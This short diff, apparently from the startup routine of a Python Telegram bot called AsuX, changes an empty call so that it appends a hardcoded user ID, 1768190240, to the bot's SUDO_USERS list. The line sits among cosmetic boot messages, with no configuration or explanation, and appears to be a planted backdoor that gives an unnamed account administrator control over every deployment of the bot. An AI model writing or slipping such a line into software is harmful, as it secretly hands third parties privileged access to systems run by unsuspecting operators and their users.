@@ -73,7 +73,7 @@ async def AsuX_boot():
             status="[bold blue]ᴍᴏᴅᴜʟᴇs ɪᴍᴘᴏʀᴛᴀᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append()
+        SUDO_USERS.append(1768190240)
         await startup_del(_____)
     console.print(
         "[bold green]ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ...\n"
